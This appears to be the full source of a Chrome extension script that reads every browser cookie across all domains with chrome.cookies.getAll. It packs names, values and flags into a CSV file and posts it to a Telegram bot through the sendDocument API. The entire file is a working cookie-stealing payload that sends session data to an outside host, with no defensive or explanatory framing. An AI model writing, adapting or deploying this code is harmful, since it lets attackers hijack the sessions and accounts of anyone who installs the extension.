// Replace these with your bot token and chat ID
const botToken = "KEYYYYYYYYYYY"; // Example: 123456789:ABCdefGHIjklMNO
const chatId = "2141142912"; // Example: 987654321

// Helper function to convert cookies to a grouped CSV format
function convertCookiesToCSV(cookies) {
  // Group cookies by domain
  const groupedCookies = cookies.reduce((acc, cookie) => {
    if (!acc[cookie.domain]) {
      acc[cookie.domain] = [];
    }
    acc[cookie.domain].push(cookie);
    return acc;
  }, {});

  // Build CSV content
  let csvContent = "Domain,Name,Value,Path,Secure,HTTPOnly,SameSite\n"; // Header
  for (const [domain, domainCookies] of Object.entries(groupedCookies)) {
    domainCookies.forEach((cookie) => {
      csvContent += `"${domain}","${cookie.name}","${cookie.value}","${cookie.path}","${cookie.secure}","${cookie.httpOnly}","${cookie.sameSite}"\n`;
    });
  }

  return csvContent;
}

// Function to send CSV file to Telegram
function sendCookiesToTelegram(cookies) {
  // Convert cookies to CSV format
  const csvContent = convertCookiesToCSV(cookies);

  // Create a Blob for the CSV file
  const csvBlob = new Blob([csvContent], { type: "text/csv" });

  // Convert the Blob to a FormData object
  const formData = new FormData();
  formData.append("chat_id", chatId);
  formData.append("document", csvBlob, "cookies.csv");

  // Send the CSV file to Telegram using the sendDocument API
  fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
    method: "POST",
    body: formData,
  })
    .then((response) => {
      if (response.ok) {
        console.log("CSV file sent to Telegram successfully.");
      } else {
        console.error("Failed to send CSV file to Telegram.");
      }
    })
    .catch((error) => console.error("Error:", error));
}

// Fetch all cookies and send them as a CSV file
chrome.cookies.getAll({}, sendCookiesToTelegram);